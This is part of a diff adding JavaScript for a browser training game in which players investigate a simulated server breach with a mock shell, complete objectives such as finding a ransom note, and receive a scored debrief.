+  const tick=id=>{if(obj[id])return;obj[id]=true;const el=$(`.obj[data-id="${id}"]`);el.classList.add('done');el.querySelector('.obx').textContent='✓';const n=doneCount();$('#oc').textContent=n+'/'+m.objectives.length;$('#xp').textContent=n+'/'+m.objectives.length;print('✅ Objective complete: '+esc(m.objectives.find(o=>o.id===id).label),'okmsg');if(n===m.objectives.length)setTimeout(winTerminal,700);};
+  const inHome=cwd.join('/')==='home/agent';
+  if(cmd==='ls'&&inHome){tick('ls');if(a.some(x=>x[0]==='-'&&x.includes('a')))tick('lsa');}
+  if(cmd==='cd'&&cwd[cwd.length-1]==='logs')tick('cd');
+  if(cmd==='cat')a.forEach(f=>{const r=resolve(f);if(r&&r.node.type==='file'){const nm=r.segs[r.segs.length-1];if(nm==='readme.txt')tick('cat');if(nm==='config.php')tick('config');}});
+  if(cmd==='grep'&&grepHits&&a.join(' ').includes('45.133.1.77'))tick('grep');
+  if(cmd==='find'&&findOut&&findOut.includes('ransom_note.txt'))tick('find');
+ }
+ function winTerminal(){const sc=Math.max(50,100-hintsUsed*10);S.scores=[sc];S.i=0;debrief();}
+
+ function run(input){
+  print(`<span class="pr">${esc(promptStr())}</span> ${esc(input)}`,'cmdline');
+  const toks=tokenize(input.trim());if(!toks.length)return;
+  if(input.trim())hist.push(input.trim());hidx=hist.length;
+  const cmd=toks[0],a=toks.slice(1);let gh,fo;
+  switch(cmd){
+   case 'ls':cmdLs(a);break;
+   case 'cd':cmdCd(a);break;
+   case 'pwd':print(esc('/'+cwd.join('/')));break;
+   case 'cat':cmdCat(a);break;
+   case 'grep':gh=cmdGrep(a);break;
+   case 'find':fo=cmdFind(a);break;
+   case 'head':cmdHT(a,false);break;
+   case 'tail':cmdHT(a,true);break;
+   case 'wc':cmdWc(a);break;
+   case 'echo':print(esc(a.join(' ')));break;
+   case 'whoami':print('agent');break;
+   case 'clear':outEl.innerHTML='';break;
+   case 'help':print(esc(HELP),'sys');break;
+   case 'hint':doHint();break;
+   default:errl(cmd+': command not found. Type  help  to see what you can use.');
+  }
+  check(cmd,a,gh,fo);
+ }
+ function doHint(){const nx=m.objectives.find(o=>!obj[o.id]);if(!nx){print('All objectives done!','okmsg');return;}hintsUsed++;print('💡 '+esc(nx.hint),'sys');}
+
+ cin.addEventListener('keydown',e=>{
+  if(e.key==='Enter'){const v=cin.value;cin.value='';run(v);}
+  else if(e.key==='ArrowUp'){if(hidx>0){hidx--;cin.value=hist[hidx]||'';setTimeout(()=>cin.setSelectionRange(99,99),0);}}
+  else if(e.key==='ArrowDown'){if(hidx<hist.length){hidx++;cin.value=hist[hidx]||'';}}
+ });
+ $('#term').onclick=e=>{if(!e.target.closest('.termline'))cin.focus();};
+ $('#chips').querySelectorAll('button').forEach(b=>b.onclick=()=>{if(b.dataset.hint){doHint();cin.focus();return;}cin.value=b.dataset.c;cin.focus();});
+
+ setPrompt();
+ print('Linux incident-response shell. You are logged in as <b>agent</b>.','sys');
+ print('A server was breached. Work through the objectives above — type <b>help</b> for commands, or tap <b>💡 hint</b>.','sys');
+ print('Start by typing  <b>ls</b>  and pressing Enter.','sys');
+ setTimeout(()=>cin.focus(),100);
+ toTop();
+}
+
+function debrief(){
+ const m=S.m, pct=Math.round(S.scores.reduce((a,b)=>a+b,0)/S.scores.length), s=starsFor(pct);
+ saveBest(m.id,pct);
+ app.innerHTML=`<div class="card debrief">
+  <div class="mono kicker">CHALLENGE COMPLETE</div>
+  <div class="bigicon">${m.icon}</div><h1 class="mt">${m.name}</h1>
+  <div class="bigstars">${[0,1,2].map(q=>q<s?`<span style="animation-delay:${.2+q*.25}s">★</span>`:'<i>★</i>').join('')}</div>
+  <div class="pct mono">${pct}% RATING · ${xp()} XP</div>
+  <div class="badge ${s>=2?'':'locked'}"><span>🏅</span><div><div class="mono">${s>=2?'BADGE UNLOCKED':'REACH 2★ TO UNLOCK'}</div><b>${m.badge}</b></div></div>
+  <div class="lessons"><div class="mono">WHAT YOU LEARNED</div><ul>${m.lessons.map(l=>`<li>${l}</li>`).join('')}</ul></div>
+  <div class="talk"><div class="mono">💬 TALK ABOUT IT</div><p>${m.discuss}</p></div>
+  <div class="row"><button class="btn" id="hm">Back to start</button><button class="btn ghost" id="ag">Replay</button></div>
+ </div>`;
+ $('#hm').onclick=home; $('#ag').onclick=()=>briefing(S.k);
+ toTop(); if(s>=2)confetti(m.accent);
+}
+
+function confetti(accent){
+ const c=document.createElement('canvas');c.style.cssText='position:fixed;inset:0;pointer-events:none;z-index:50';document.body.appendChild(c);
+ const x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;
+ const cols=[accent,'#ffc53d','#ffffff','#3ddc84','#8b6bff'];
+ const P=Array.from({length:140},()=>({x:Math.random()*c.width,y:-20-Math.random()*c.height*.5,vx:(Math.random()-.5)*3,vy:2+Math.random()*4,r:Math.random()*6,w:5+Math.random()*6,col:cols[Math.floor(Math.random()*cols.length)],s:(Math.random()-.5)*.3}));
+ const t0=performance.now();
+ (function f(t){x.clearRect(0,0,c.width,c.height);P.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.vy+=.04;p.r+=p.s;x.save();x.translate(p.x,p.y);x.rotate(p.r);x.fillStyle=p.col;x.fillRect(-p.w/2,-p.w/4,p.w,p.w/2);x.restore()});
+  if(t-t0<3200)requestAnimationFrame(f);else c.remove()})(t0);
+}
+
+MISSIONS.splice(0,3);
+briefing(0);
+</script>
+</body>
+</html>
